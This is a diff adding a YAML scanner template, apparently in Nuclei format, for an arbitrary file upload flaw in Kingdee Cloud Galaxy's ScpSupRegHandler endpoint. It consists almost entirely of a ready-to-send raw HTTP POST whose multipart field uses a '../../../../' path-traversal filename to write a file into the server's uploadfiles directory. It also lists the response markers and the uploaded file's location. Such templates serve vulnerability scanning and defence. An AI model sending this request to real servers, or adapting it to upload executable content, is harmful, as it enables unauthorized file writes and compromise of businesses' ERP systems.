@@ -1,0 +1,87 @@
+id: poc-lka2lddk2ys94f3t
+info:
+  name: 金蝶云星空ScpSupRegHandler任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lka2lddk2ys94f3t'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lka2lddk2ys94f3t
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Length: 283
+
+
+    Content-Type: multipart/form-data; boundary=zsqxokga
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    --zsqxokga
+
+
+    Content-Disposition: form-data; name="dbId_v"
+
+
+
+
+    .
+
+
+    --zsqxokga
+
+
+    Content-Disposition: form-data; name="FID"
+
+
+
+
+    2022
+
+
+    --zsqxokga
+
+
+    Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/dudesuite.txt"
+
+
+    Content-Type: text/plain
+
+
+
+
+    dudesuite
+
+
+    --zsqxokga--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    IsSuccess
+
+
+    # 上传文件定位
+
+    /k3cloud/uploadfiles/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
